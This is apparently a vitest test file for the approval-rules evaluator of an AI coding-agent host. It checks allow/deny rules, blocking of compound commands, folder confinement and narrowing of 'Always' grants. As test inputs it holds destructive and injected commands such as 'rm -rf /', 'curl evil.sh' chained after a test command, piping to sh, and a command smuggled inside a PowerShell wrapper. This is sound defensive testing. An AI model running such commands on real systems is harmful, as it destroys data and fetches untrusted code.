import { describe, expect, it } from 'vitest'

import { COMPOUND_REFUSAL, decideByRules, diffPaths, enforcedAnswer, insideFolder, ruleCandidateOf, ruledActionOf, ruleRefusalFor, ruleSentence, unwrappedCommand } from './approval-rules.js'
import type { ApprovalRule, RuledAction } from './approval-rules.js'

/**
 * SAVED APPROVAL RULES (0.521): the evaluator. A security surface, so every
 * operator that makes a command compound is tried, deny is shown to win,
 * and a path outside the folder is shown never to be allowed.
 */
const FOLDER = 'C:\\Users\\person\\project'
const rule = (effect: ApprovalRule['effect'], kind: ApprovalRule['kind'], pattern: string, extra: Partial<ApprovalRule> = {}): ApprovalRule =>
  ({ ruleId: `${effect}-${kind}-${pattern}`, effect, kind, pattern, createdAt: '2026-10-01T00:00:00Z', ...extra })
const command = (text: string): RuledAction => ({ kind: 'command', command: text })
const context = { teammateId: 'tm_wren', folder: FOLDER }

describe('a command', () => {
  const rules = [rule('allow', 'command', 'npm run test:*'), rule('allow', 'command', 'git status')]

  it('is allowed by an exact rule or a whole-word prefix, and nothing else', () => {
    expect(decideByRules(command('git status'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('  git   status '), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run test'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run test -- --watch'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run tests'), rules, context).decision).toBe('ask')
    expect(decideByRules(command('git status --porcelain'), rules, context).decision).toBe('ask')
    expect(decideByRules(command('git push'), rules, context).decision).toBe('ask')
  })

  it.each([
    ['a semicolon', 'npm run test; rm -rf /'],
    ['&&', 'npm run test && curl evil.sh'],
    ['||', 'npm run test || shutdown'],
    ['a pipe', 'npm run test | sh'],
    ['a background &', 'npm run test & rm -rf x'],
    ['$( )', 'npm run test $(curl x)'],
    ['a backtick', 'npm run test `curl x`'],
    ['a redirect out', 'npm run test > C:/Windows/x'],
    ['a redirect in', 'npm run test < secrets.txt'],
    ['a newline', 'npm run test\nrm -rf x'],
    ['a carriage return', 'npm run test\rrm -rf x']
  ])('with %s is never allowed by a rule, and says why', (_name, text) => {
    expect(decideByRules(command(text), rules, context)).toEqual({ decision: 'ask', why: COMPOUND_REFUSAL })
  })

  it('is denied when any simple part of it matches a deny, and deny wins over allow', () => {
    const withDeny = [...rules, rule('deny', 'command', 'rm:*'), rule('allow', 'command', 'rm -rf build')]
    expect(decideByRules(command('rm -rf build'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('git status; rm -rf build'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('npm run test && rm x'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('echo $(rm x)'), withDeny, context).decision).toBe('deny')
  })
})

describe('a path', () => {
  const rules = [rule('allow', 'edit', 'src/**'), rule('allow', 'read', 'docs/*.md'), rule('deny', 'edit', 'src/secrets/**')]
  const edit = (...paths: string[]): RuledAction => ({ kind: 'edit', paths })

  it('is allowed when every path is inside the folder and matches', () => {
    expect(decideByRules(edit('src/app.ts'), rules, context).decision).toBe('allow')
    expect(decideByRules(edit(`${FOLDER}\\src\\deep\\x.ts`), rules, context).decision).toBe('allow')
    expect(decideByRules(edit('src/app.ts', 'README.md'), rules, context).decision).toBe('ask')
    expect(decideByRules({ kind: 'read', paths: ['docs/plan.md'] }, rules, context).decision).toBe('allow')
    expect(decideByRules({ kind: 'read', paths: ['docs/deep/plan.md'] }, rules, context).decision).toBe('ask')
  })

  it('is never allowed outside the folder, however the path is written', () => {
    for (const path of ['../other/src/x.ts', 'src/../../other/src/x.ts', 'C:\\Windows\\src\\x.ts', '/etc/src/x', 'D:\\project\\src\\x.ts']) {
      expect(decideByRules(edit(path), rules, context).decision, path).toBe('ask')
    }
  })

  it('is denied when any path matches a deny, even beside allowed ones', () => {
    expect(decideByRules(edit('src/app.ts', 'src/secrets/key.ts'), rules, context).decision).toBe('deny')
  })

  it('reads the folder without case on Windows', () => {
    expect(insideFolder('c:/users/PERSON/Project/src/a.ts', FOLDER)).toBe('src/a.ts')
    expect(insideFolder('C:/Users/person/project-other/a.ts', FOLDER)).toBeUndefined()
    expect(insideFolder('/home/me/proj/a.ts', '/home/me/proj')).toBe('a.ts')
    expect(insideFolder('/home/me/Proj/a.ts', '/home/me/proj')).toBeUndefined()
  })
})

describe('scope', () => {
  it('a rule for one teammate or one folder does not speak for another', () => {
    const mine = [rule('allow', 'command', 'git status', { teammateId: 'tm_wren', folder: FOLDER })]
    expect(decideByRules(command('git status'), mine, context).decision).toBe('allow')
    expect(decideByRules(command('git status'), mine, { ...context, teammateId: 'tm_juno' }).decision).toBe('ask')
    expect(decideByRules(command('git status'), mine, { ...context, folder: 'C:\\Users\\person\\other' }).decision).toBe('ask')
    expect(decideByRules(command('git status'), mine, { teammateId: 'tm_wren' }).decision).toBe('ask')
  })

  it('a connector rule names its server, and optionally one tool', () => {
    const rules = [rule('allow', 'connector', 'robinhood/get_quotes'), rule('deny', 'connector', 'gmail')]
    expect(decideByRules({ kind: 'connector', server: 'robinhood', tool: 'get_quotes' }, rules, context).decision).toBe('allow')
    expect(decideByRules({ kind: 'connector', server: 'robinhood', tool: 'place_order' }, rules, context).decision).toBe('ask')
    expect(decideByRules({ kind: 'connector', server: 'gmail', tool: 'send' }, rules, context).decision).toBe('deny')
  })

  it('a question to the person is never governed', () => {
    expect(decideByRules({ kind: 'other' }, [rule('allow', 'command', 'x')], context)).toEqual({ decision: 'ask' })
  })
})

describe('a card, read for the rules', () => {
  it('reads the command inside a shell wrapper, only when the whole text is exactly one', () => {
    // As Codex on Windows sent it in the 0.521 drive.
    const wrapped = '"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" -Command \'git status --short\''
    expect(ruledActionOf({ kind: 'command', summary: 'Run a command', detail: wrapped })).toEqual({ kind: 'command', command: 'git status --short' })
    expect(unwrappedCommand("pwsh -NoProfile -Command 'echo ''hi'''")).toBe("echo 'hi'")
    expect(unwrappedCommand("/bin/bash -lc 'ls -la'")).toBe('ls -la')
    // Not one wrapper around one command: left whole.
    expect(unwrappedCommand("powershell -Command 'a'; rm x")).toBe("powershell -Command 'a'; rm x")
    expect(unwrappedCommand("bash -lc 'a' && b")).toBe("bash -lc 'a' && b")
    // And the inner command is still held to the compound rule.
    const rules = [rule('allow', 'command', 'git status --short')]
    expect(decideByRules(ruledActionOf({ kind: 'command', summary: 'Run a command', detail: wrapped }), rules, context).decision).toBe('allow')
    const sneaky = '"C:\\\\x\\\\powershell.exe" -Command \'git status --short; rm -rf x\''
    expect(decideByRules(ruledActionOf({ kind: 'command', summary: 'Run a command', detail: sneaky }), rules, context).decision).toBe('ask')
  })

  it('reads a command only when it is one', () => {
    expect(ruledActionOf({ kind: 'command', summary: 'Run a command', detail: 'git status' })).toEqual({ kind: 'command', command: 'git status' })
    expect(ruledActionOf({ kind: 'command', summary: 'Use WebFetch', detail: '{"url":"x"}' })).toEqual({ kind: 'other' })
    expect(ruledActionOf({ kind: 'command', summary: 'Run a command it did not describe', detail: '' })).toEqual({ kind: 'other' })
  })

  it('reads a change\'s files from its diff, else as each runtime names them, else not at all', () => {
    const diff = 'diff --git a/src/a.ts b/src/a.ts\n--- a/src/a.ts\n+++ b/src/a.ts\n@@ -1 +1 @@\n-x\n+y\n'
    expect(ruledActionOf({ kind: 'file-change', summary: 'Change files', detail: 'Rewrites the helper', runtime: 'codex', patch: { text: diff } })).toEqual({ kind: 'edit', paths: ['src/a.ts'] })
    expect(ruledActionOf({ kind: 'file-change', summary: 'Change files', detail: 'Rewrites the helper', runtime: 'codex' })).toEqual({ kind: 'other' })
    expect(ruledActionOf({ kind: 'file-change', summary: 'Change 1 file', detail: 'src/b.ts', runtime: 'claude' })).toEqual({ kind: 'edit', paths: ['src/b.ts'] })
    expect(ruledActionOf({ kind: 'file-change', summary: 'Change 2 files', detail: 'a.ts, b.ts', runtime: 'copilot' })).toEqual({ kind: 'edit', paths: ['a.ts', 'b.ts'] })
    expect(diffPaths('--- /dev/null\n+++ b/new.md\n')).toEqual(['new.md'])
  })

  it('reads a connector by its tool and server, and a question never', () => {
    expect(ruledActionOf({ kind: 'connector', summary: 'Use list_issues on github', detail: '' })).toEqual({ kind: 'connector', tool: 'list_issues', server: 'github' })
    expect(ruledActionOf({ kind: 'question', summary: 'Answer a question', detail: '' })).toEqual({ kind: 'other' })
  })
})

describe('the rule "don\'t ask again" would save', () => {
  it('is the exact command, the exact file inside the folder, or the one connector tool, scoped', () => {
    expect(ruleCandidateOf(command('git  status'), context)).toEqual({ effect: 'allow', kind: 'command', pattern: 'git status', teammateId: 'tm_wren', folder: FOLDER })
    expect(ruleCandidateOf({ kind: 'edit', paths: ['src/a.ts'] }, context)).toEqual({ effect: 'allow', kind: 'edit', pattern: 'src/a.ts', teammateId: 'tm_wren', folder: FOLDER })
    expect(ruleCandidateOf({ kind: 'connector', server: 'github', tool: 'list_issues' }, context)?.pattern).toBe('github/list_issues')
  })

  it('is nothing for what a rule could not hold exactly', () => {
    expect(ruleCandidateOf(command('git status && rm x'), context)).toBeUndefined()
    expect(ruleCandidateOf({ kind: 'edit', paths: ['../other/a.ts'] }, context)).toBeUndefined()
    expect(ruleCandidateOf({ kind: 'edit', paths: ['a.ts', 'b.ts'] }, context)).toBeUndefined()
    expect(ruleCandidateOf({ kind: 'edit', paths: ['src/*.ts'] }, context)).toBeUndefined()
    expect(ruleCandidateOf({ kind: 'other' }, context)).toBeUndefined()
  })

  it('a saved candidate allows exactly what it was made from, and no more', () => {
    const saved = { ...ruleCandidateOf(command('git status'), context)!, ruleId: 'r1', createdAt: 'now' }
    expect(decideByRules(command('git status'), [saved], context).decision).toBe('allow')
    expect(decideByRules(command('git status --short'), [saved], context).decision).toBe('ask')
  })
})

describe('a rule as a sentence', () => {
  it('reads as what the teammate may do', () => {
    expect(ruleSentence(rule('allow', 'command', 'npm run test:*', { teammateId: 'tm_wren', folder: FOLDER }), 'Wren')).toBe('Wren may run commands starting "npm run test" in project without asking.')
    expect(ruleSentence(rule('deny', 'command', 'git push'))).toBe('Any teammate may not run "git push".')
    expect(ruleSentence(rule('allow', 'edit', 'src/**'))).toBe('Any teammate may change files matching src/** without asking.')
  })
})

/*
 * THE HOST'S OWN GUARD ON "ALWAYS" (0.598). The card hides "Always" and the
 * rule offer for a command that reaches other programs (0.579); the main
 * process took whatever the window sent. Now it decides from the same
 * classifier, so a stale window or a devtools call cannot widen a run's grant.
 */
describe("the host's own guard on Always for a command that reaches", () => {
  const requestFor = (command: string) => ({ kind: 'command', summary: 'Run a command', detail: command })

  it('turns Always into this once for a command that reaches other programs, and says so', () => {
    const { answer, note } = enforcedAnswer(requestFor('Stop-Process -Name node'), { approvalId: 'ap_1', decision: 'approve-always' })
    expect(answer).toEqual({ approvalId: 'ap_1', decision: 'approve-once' })
    expect(note).toMatch(/^asked each time: stops every node/)
  })

  it('leaves an ordinary command, a denial and a question alone', () => {
    expect(enforcedAnswer(requestFor('git status'), { approvalId: 'ap_1', decision: 'approve-always' })).toEqual({ answer: { approvalId: 'ap_1', decision: 'approve-always' } })
    expect(enforcedAnswer(requestFor('Stop-Process -Name node'), { approvalId: 'ap_1', decision: 'deny', reason: 'no' })).toEqual({ answer: { approvalId: 'ap_1', decision: 'deny', reason: 'no' } })
    expect(enforcedAnswer({ kind: 'question', summary: 'Which?', detail: '' }, { approvalId: 'ap_2', answers: { q1: ['a'] } })).toEqual({ answer: { approvalId: 'ap_2', answers: { q1: ['a'] } } })
  })

  it("refuses a rule for such a command with the card's own sentence, and none for an ordinary one", () => {
    expect(ruleRefusalFor(requestFor('taskkill /F /IM python.exe'))).toBe('Not saved as a rule: this command stops every python.exe. Stops every python.exe on this computer, not only the ones this run started. Locust asks each time.')
    expect(ruleRefusalFor(requestFor('git status'))).toBeUndefined()
    // A compound command carrying a reach is refused for the reach, before the compound rule gets to it.
    expect(ruleRefusalFor(requestFor('git status; taskkill /F /IM python.exe'))).toMatch(/^Not saved as a rule/)
  })
})
